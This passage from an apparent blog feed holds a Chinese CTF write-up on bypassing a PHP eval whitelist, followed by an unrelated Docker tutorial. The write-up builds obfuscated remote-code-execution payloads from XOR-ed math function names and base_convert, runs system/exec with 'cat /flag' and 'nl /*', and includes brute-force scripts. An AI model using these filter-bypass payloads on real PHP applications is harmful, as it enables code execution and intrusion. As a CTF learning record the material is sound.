class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>eval函数参数若是字符串，必须符合php代码语法，因此可以插入多行代码</p></blockquote><h2 id="0x01-利用math函数构造函数名"><a href="#0x01-利用math函数构造函数名" class="headerlink" title="0x01 利用math函数构造函数名"></a>0x01 利用math函数构造函数名</h2><h3 id="进制转换–获取小写字母"><a href="#进制转换–获取小写字母" class="headerlink" title="进制转换–获取小写字母"></a>进制转换–获取小写字母</h3><p>利用到进制转换，从11进制到36进制均有小写字母，在保证转换结果简洁及纯数字的情况下，选择36进制转10进制(36进制含a-z)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//先反向</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//15941</span><br><span class="hljs-comment">//这样就可以用纯数字通过三十六进制转换得到纯字母字符串了</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<span class="hljs-comment">//cat</span><br></code></pre></td></tr></table></figure><h3 id="字符串异或–获取特殊字符及其组合"><a href="#字符串异或–获取特殊字符及其组合" class="headerlink" title="字符串异或–获取特殊字符及其组合"></a>字符串异或–获取特殊字符及其组合</h3><h4 id="异或性质"><a href="#异或性质" class="headerlink" title="异或性质"></a>异或性质</h4><ol><li>结合律a ^ b ^ c &#x3D; a ^ c ^ b</li><li>交换律a ^ b &#x3D; b ^ a</li><li>数值交换（能交换 a 与 b 的值）a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="php字符串异或分为两种情况"><a href="#php字符串异或分为两种情况" class="headerlink" title="php字符串异或分为两种情况"></a>php字符串异或分为两种情况</h4><ul><li><p>长度一致的字符串异或，对应字符各自转换成ascii码值异或后得到新字符，组成新字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*\/&quot;</span>;<span class="hljs-comment">//^=A</span><br></code></pre></td></tr></table></figure></li><li><p>长度不一致的字符串异或，按最短的字符串长度按位异或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*&quot;</span>;<span class="hljs-comment">//^</span><br></code></pre></td></tr></table></figure></li></ul><p>异或字符串可以构造出新字符，但只用白名单的函数名的话，大多是ascii码值接近的小写字母，异或后得到的也多是ascii码值小的<u>不可见字符</u>，不够全面。</p><p>因此可以利用<code>a^b^b=a</code>这个性质，将a看作要获取的特殊字符，b为白名单函数名异或组合,靠脚本爆破出可以通过进制转换表示的<code>a^b</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//爆破脚本</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$whitelist1</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-variable">$whitelist2</span> = [ <span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-comment">//与whitelist1相同</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>):<br>   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>):<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>^<span class="hljs-variable">$i</span>^<span class="hljs-string">&quot; /&quot;</span>;<span class="hljs-comment">//a^b</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$k</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-keyword">endforeach</span>;<br><span class="hljs-keyword">endforeach</span>;<br></code></pre></td></tr></table></figure><blockquote><p>输出结果说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">16</span>   tanh exp <span class="hljs-comment">//意思是&quot; /&quot;^tanh^exp=&quot;16&quot;</span><br><span class="hljs-comment">//因此要想得到&quot; /&quot;只要</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">22</span>)^tanh^exp  <span class="hljs-comment">//即&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span><br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-number">10</span>)^tanh^exp<span class="hljs-comment">//也可以</span><br></code></pre></td></tr></table></figure><h4 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h4><ul><li><p>不能直接<code>16^tanh^exp</code> ，这样的16会被当作int型数据处理，使用进制转换函数可以转成string类型，同时选取的数值转成16进制不能有字母。</p></li><li><p>根据长度不一致字符串异或的运算规则，白名单中最短的是pi，因此特殊字符组合尽量不超过两个，如果一定要更长的特殊字符组合，要删除白名单中较短的函数名，不然得到的结果都是截断的，而特殊字符组合越长，白名单中可用函数名也就越少，出现纯数字结果的可能性也越低，这也是为什么这里不能直接构造<code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一旦将特殊字符改成大写字母或与下划线的组合，输出中几乎没有纯数字结果。</p><h3 id="引入数字字符串的异或–构造下划线和大写字母组合"><a href="#引入数字字符串的异或–构造下划线和大写字母组合" class="headerlink" title="引入数字字符串的异或–构造下划线和大写字母组合"></a>引入数字字符串的异或–构造下划线和大写字母组合</h3><p>上面的异或结果可以归纳成<code>特殊字符组合^白名单函数1^白名单函数2=纯数字字符串</code>。</p><p>因此可以合理推测<code>纯数字字符串^白名单函数1^白名单函数2=特殊字符组合</code>。</p><p>纯字符串如果用<code>dechex</code>的方式转换，非常浪费payload长度，可以利用字符串拼接时类型转换的特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span>=(<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$i</span>);<span class="hljs-comment">//string(2) &quot;12&quot;</span><br></code></pre></td></tr></table></figure><p>爆破脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<span class="hljs-comment">//$i $j字符串拼接得到&quot;00&quot;-&quot;99&quot;</span><br>            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于pi的存在，构造出来的组合都是两个字符，会惊喜地发现大多数为下划线和大写字母组合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">结果中 tanh^<span class="hljs-number">15</span>==&gt;ET is_nan^<span class="hljs-number">64</span>==&gt;_G <br>因此构造 (is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>)) 正是 <span class="hljs-string">&quot;_G&quot;</span>.<span class="hljs-string">&quot;ET&quot;</span> ，即 <span class="hljs-string">&quot;_GET&quot;</span><br></code></pre></td></tr></table></figure><p>再根据PHP可变变量的特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//$_GET[1]</span><br></code></pre></td></tr></table></figure><p>{}可以代替[],这样就可以通过get传参数，缩短payload长度</p></blockquote><p>$_GET[1]接收的数值会转换成字符串，因此即使拼接到了代码中也无法执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg" alt="1"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg" alt="2"></p><p>因此需要像eval这样的函数执行字符串php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">42633</span>,<span class="hljs-number">19</span>,<span class="hljs-number">33</span>)(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>也可以利用php可变函数的特性：<code>($a)[system]($_GET[1])</code> –&gt;php会将<code>$_GET[1]</code>的内容当作参数传入system函数执行。<code>$a</code>只要求是个变量，在这题的背景下可以用<code>$pi</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">0</span>&#125;(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="0x02-payload缩短技巧"><a href="#0x02-payload缩短技巧" class="headerlink" title="0x02 payload缩短技巧"></a>0x02 payload缩短技巧</h2><h3 id="通过外部传参数"><a href="#通过外部传参数" class="headerlink" title="通过外部传参数"></a>通过外部传参数</h3><ul><li><p>使用$_GET[1]，索引选择最简短且符合题目要求的数字1，系统命令通过1传参，不占有payload</p></li><li><p>使用getallheaders获取请求头信息，将索引设成1，将获取header中key为1的value，再将这个结果传入exec函数，但这个payload较长，超过60字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//base_convert(696468,10,36) -&gt; exec</span><br><span class="hljs-comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="hljs-comment">//exec(getallheaders()&#123;1&#125;)</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="穷举进制转换"><a href="#穷举进制转换" class="headerlink" title="穷举进制转换"></a>穷举进制转换</h3><p>如果要得到flag字符串，10进制转36进制需要数字为727432,有6位，而通过脚本穷举+正则匹配筛选可以发现32进制转22进制时，只需要4位数字就可以得到flag</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$tmp</span>)-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-variable">$num</span>)<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">11</span>+<span class="hljs-variable">$num</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">10</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$res</span>.= <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>*<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;&#125;\n/&#x27;</span>,<span class="hljs-variable">$res</span>,<span class="hljs-variable">$mc</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg" alt="image-20220809211543165"></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-一些尝试"><a href="#0x03-一些尝试" class="headerlink" title="0x03 一些尝试"></a>0x03 一些尝试</h2><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>上面的payload几乎都使用了花括号来访问数组，如果题目过滤了花括号，那么是否可以在保证长度尽可能小的情况下,构造无花括号payload</p><blockquote><p>PHP7.4不再能够使用花括号来访问<a href="https://www.yuanmaluntan.com/tags-11630.html">数组</a>或者字符串的偏移.需要将{}修改成[] （本题环境为7.3.9）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg" alt="4"></p><h3 id="无花括号payload"><a href="#无花括号payload" class="headerlink" title="无花括号payload"></a>无花括号payload</h3><p>由于传入的是字符串，反引号不能被识别为系统命令执行，因此使用名称较短的exec函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>但是这样就不能外部传入命令来节省payload，因此要求执行的命令足够短，这里使用nl命令</p><p>linux下执行<code>nl /*</code>扫描根目录，会打印根目录下所有文件，不会目录向下递归</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg" alt="6"></p><blockquote><p><code>nl [参数] [文件]</code></p><p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">aff   rad2deg sin <span class="hljs-comment">//`nl</span><br><span class="hljs-number">16</span>   exp tan   <span class="hljs-comment">// /</span><br><span class="hljs-number">9</span>f   cos pi  <span class="hljs-comment">//*`</span><br>  <br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">2815</span>)^rad2deg^sin).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>)^exp^tan).(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">159</span>)^cos^pi) <span class="hljs-comment">//`nl /*`</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca   abs log <span class="hljs-comment">//nl</span><br><span class="hljs-number">164</span>   exp tan <span class="hljs-comment">// /*</span><br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).(<span class="hljs-title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="hljs-comment">//nl /*</span><br></code></pre></td></tr></table></figure><p>用上面的穷举脚本找出最适合的进制转换exec</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;34 23 22950&quot;</span>&#125;<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>) <span class="hljs-comment">//exec</span><br></code></pre></td></tr></table></figure><p>无花括号payload</p><p>长度:70</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)((<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)^exp^tan))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg" alt="7"></p><p>本地php7.4以上也能成功执行(但是php8以后有个fatal error 不能使用未定义常量，直接用函数名异或的时候会识别成常量)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg" alt="9"></p><p>不过这边尝试了下带花括号的，似乎也能成功，花括号只在php8以后才被定义为<strong>Fatal error</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg" alt="11"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/12/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="docker学习"><a href="#docker学习" class="headerlink" title="docker学习"></a>docker学习</h1><h2 id="dockerfile启动环境"><a href="#dockerfile启动环境" class="headerlink" title="dockerfile启动环境"></a>dockerfile启动环境</h2><p>事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker <span class="hljs-keyword">build </span>-t nginx:<span class="hljs-built_in">v1</span> . <br></code></pre></td></tr></table></figure><blockquote><p>-t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。</p><p>⚠️不要忘记版本号后空格加一个<code>.</code> 最后的<code>.</code>代表本次执行的上下文路径</p><p>上下文路径:是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。默认上下文路径就是 Dockerfile 所在的位置a</p><p>⚠️上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p></blockquote><p>使用<code>docker images</code>命令查看镜像是否创建成功，若成功会发现有一个刚创建的nginx镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REPOSITORY</span>    TAG   IMAGE ID       CREATED        SIZE<br><span class="hljs-attribute">nginx</span>         v1   <span class="hljs-number">3</span>efd9464e2a0   <span class="hljs-number">2</span> hours ago    <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><p>利用该镜像启动容器，注意端口映射</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -p 本地端口：容器端口 镜像名称<br>docker <span class="hljs-built_in">run</span>  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 nginx:v1<br></code></pre></td></tr></table></figure><blockquote><p>意思是启动一个名字为docker_nginx_v1的容器，使用nginx:v1镜像，并将本机127.0.0.1:5001映射到该容器的80端口(因为nginx的默认端口是<strong>80</strong>)，因此建立成功后可以从127.0.0.1:5001访问该环境</p><p>注：</p><p>1.容器默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在容器的端口后面加上 &#x2F;udp</p><p>2.-d:在后台运行</p><p>3.-it:交互式方式运行</p><p>4.-p:指定端口</p></blockquote><p><code>docker ps</code>查看正在运行的容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CONTAINER</span> ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES<br><span class="hljs-attribute">dd0c50ae3ef8</span>   nginx:v1   <span class="hljs-string">&quot;/docker-entrypoint.…&quot;</span>   <span class="hljs-number">4</span> seconds ago   Up <span class="hljs-number">3</span> seconds   <span class="hljs-number">127.0.0.1:5001</span>-&gt;<span class="hljs-number">80</span>/tcp   docker_nginx_v1<br></code></pre></td></tr></table></figure><p>访问127.0.0.1:5001</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg" alt="image-20220501191611894"></p><p>dockerfile的内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span><br></code></pre></td></tr></table></figure><h2 id="使用dockerfile构建镜像"><a href="#使用dockerfile构建镜像" class="headerlink" title="使用dockerfile构建镜像"></a>使用dockerfile构建镜像</h2><p>Dockerfile整体就两类语句组成：</p><ul><li># Comment 注释信息</li><li>Instruction arguments 指令 参数，一行一个指令。</li></ul><p>⚠️</p><ol><li>Dockerfile文件名<strong>首字母必须大写</strong>。</li><li>Dockerfile指令不区分大小写，但是为方便和参数做区分，通常<strong>指令使用大写字母。</strong></li><li>Dockerfile中指令按顺序从上至下依次执行。</li><li>Dockerfile中第一个非注释行必须是<strong>FROM指令</strong>，用来指定制作当前镜像依据的是哪个基础镜像。</li><li>Dockerfile中需要调用的文件必须跟Dockerfile文件在同一目录下，或者在其子目录下，父目录或者其它路径无效。</li></ol><h3 id="FROM和RUN"><a href="#FROM和RUN" class="headerlink" title="FROM和RUN"></a>FROM和RUN</h3><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell格式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> &lt;命令行命令&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>&lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</p></blockquote><p>exec格式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>, <span class="hljs-string">&quot;参数1&quot;</span>, <span class="hljs-string">&quot;参数2&quot;</span>]</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;./test.php&quot;</span>, <span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;offline&quot;</span>] </span><br><span class="hljs-comment"># 等价于 RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure><blockquote><p>如果有多条命令执行，不要分成多个RUN语句，dockerfile的指令每执行一次都会在 docker 